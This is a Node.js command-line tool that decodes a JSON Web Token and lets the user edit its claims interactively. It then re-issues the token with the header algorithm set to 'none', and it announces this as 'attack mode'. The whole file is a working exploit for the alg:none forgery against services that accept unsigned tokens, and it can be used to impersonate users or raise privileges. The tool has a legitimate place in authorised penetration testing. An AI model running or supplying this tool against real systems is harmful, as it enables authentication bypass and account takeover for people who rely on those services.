const jwt = require("jsonwebtoken");
const readline = require("readline");
const jwtRead = require('./scripts/utils/jwtReader.js')

const jwtSign = require('./scripts/utils/jwtSigner.js')

async function getInput(prompt) {
  const rl = readline.createInterface(process.stdin, process.stdout);
  return new Promise((resolve, reject) => rl.question(prompt, (token) => {
    rl.close()
    resolve(token)
  }))
}


(async () => {
  const token = await getInput('Enter JWT token here: ');
  let decoded = jwtRead(token)
  const payload = decoded.payload;
  const isRSA = decoded.headers.alg.slice(0,2)==='RS';
  const potentialKnownKey = await getInput('If you know the JWT signing key, enter it now. If not,' +
    'type anything to continue: ');
  let keyKnown = false;
  try {
    jwt.verify(token,potentialKnownKey)
    keyKnown = true
    console.log('This key has been verified, and used to sign the token.')
  } catch {
    console.log('This key was not used to sign this token. Using attack mode instead.')
  }
  let path = [];
  while (true) {
    let obj = payload;
    for (const prop of path) {
      obj = obj[prop];
    }
    console.log(obj);
    const answer = await getInput(`
Enter 'set' to change a key's value,
      'cd' to navigate to a nested object,
      'save' to save and exit,
      'back' to navigate out of a nested object:
`);
    if (answer === "save") {
      decoded.headers.alg = 'none'
      const newToken = jwtSign(decoded.headers,payload, null,null,'none');
      console.log('None-signed token: ');
      console.log(newToken)
      return;
    } else if (answer === "cd") {
      const key = await getInput("Enter the key of the nested object: ");
      if (obj[key] && typeof obj[key] === "object") {
        path.push(key);
      } else {
        console.error("Invalid key or not an object.");
      }
    } else if (answer === "set") {
      const key = await getInput("Enter the key to set: ");
      if (obj.hasOwnProperty(key)) {
        const value = await getInput("Enter the new value: ");
        try {
          obj[key] = JSON.parse(value);
        } catch (err) {
          obj[key] = value;
        }
      } else {
        console.error("Invalid key.");
      }
    } else if (answer === "back") {
      path.pop();
    } else {
      console.error("Invalid syntax.");
    }
  }
})();
